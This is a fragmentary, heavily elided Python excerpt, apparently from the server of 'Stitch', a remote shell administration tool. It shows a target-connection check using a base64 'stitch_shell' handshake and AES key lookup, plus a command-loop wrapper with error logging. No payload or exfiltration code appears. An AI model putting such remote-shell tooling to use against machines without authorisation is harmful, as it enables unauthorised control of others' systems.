        ...
        if len(line.split()) != 1:
            ...
            if str(self.target) in self.inf_sock:
                ...
                try:
                    ...
                    if st_confirm == base64.b64encode(b'stitch_shell').decode('ascii'):
                        ...
                        if conn_aes in self.aes_lib.sections():
                            ...
                            if no_error(target_os):
                                if windows_client(target_os):
                                    ...
                                    st_log.error('Unsupported OS: {}'.format(target_os))
...
def server_main():
    try:
        ...
        # Start the command loop with error handling
        while True:
            try:
                st.cmdloop()
                break  # Exit normally if cmdloop returns
            except KeyboardInterrupt:
                st_log.info("KeyboardInterrupt in cmdloop")
                st.do_exit()
                break
            except EOFError:
                st_log.info("EOF received, exiting")
                st.do_exit()
                break
            except Exception as e:
                st_log.error("Exception in cmdloop: {}".format(str(e)))
                # Continue the loop instead of exiting
                st_print("[!] Error in command loop: {}\n".format(str(e)))
                st_print("[*] Continuing...\n")
                continue
        ...
        st_log.error("Exiting Stitch due to an exception:\n{}".format(str(e)))
        st_print("[!] {}\n".format(str(e)))
        try:
            st.do_exit()
        except:
